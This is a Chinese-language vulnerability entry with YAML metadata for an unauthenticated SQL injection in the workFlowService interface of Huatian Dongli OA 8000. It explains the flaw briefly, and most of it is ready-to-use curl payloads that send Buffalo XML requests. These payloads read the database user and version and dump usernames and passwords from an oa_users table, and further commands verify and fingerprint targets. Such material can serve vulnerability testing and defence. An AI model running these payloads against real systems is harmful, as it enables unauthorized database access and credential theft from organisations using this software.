---
id: HUATIAN-SQLI
title: 华天动力OA 8000 workFlowService SQL注入漏洞
product: huatian-oa
vendor: 华天动力
version_affected: "华天动力OA 8000版"
severity: HIGH
tags: [sqli, 无需认证, 国产, oa]
fingerprint: ["华天动力", "OA8000"]
---

## 漏洞描述

华天动力OA 8000 版的 workFlowService 接口存在 SQL 注入漏洞，该接口使用 Buffalo 协议处理 XML 请求，攻击者可在 XML 的 `<string>` 标签中注入 SQL 语句，无需认证即可执行任意查询获取数据库信息。

## 影响版本

- 华天动力OA 8000 版

## 前置条件

- 无需认证
- 目标运行华天动力OA 8000

## 利用步骤

1. 确认目标为华天动力OA
2. 向 workFlowService 接口发送 Buffalo 格式 XML 请求
3. 在 `<string>` 参数中注入 SQL 语句
4. 从响应中获取数据库信息

## Payload

```bash
# 获取当前数据库用户
curl -s "http://target/OAapp/bfapp/buffalo/workFlowService" \
  -X POST \
  -H "Content-Type: text/xml" \
  -d '<buffalo-call>
<method>getDataListForTree</method>
<string>select user()</string>
</buffalo-call>'

# 获取数据库版本
curl -s "http://target/OAapp/bfapp/buffalo/workFlowService" \
  -X POST \
  -H "Content-Type: text/xml" \
  -d '<buffalo-call>
<method>getDataListForTree</method>
<string>select version()</string>
</buffalo-call>'

# 查询用户表
curl -s "http://target/OAapp/bfapp/buffalo/workFlowService" \
  -X POST \
  -H "Content-Type: text/xml" \
  -d '<buffalo-call>
<method>getDataListForTree</method>
<string>select username,password from oa_users limit 10</string>
</buffalo-call>'
```

## 验证方法

```bash
curl -s "http://target/OAapp/bfapp/buffalo/workFlowService" \
  -X POST -H "Content-Type: text/xml" \
  -d '<buffalo-call><method>getDataListForTree</method><string>select user()</string></buffalo-call>' \
  | grep -i "root\|admin\|buffalo"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "华天动力\|OA8000"
curl -s "http://target/OAapp/" -o /dev/null -w "%{http_code}"
```
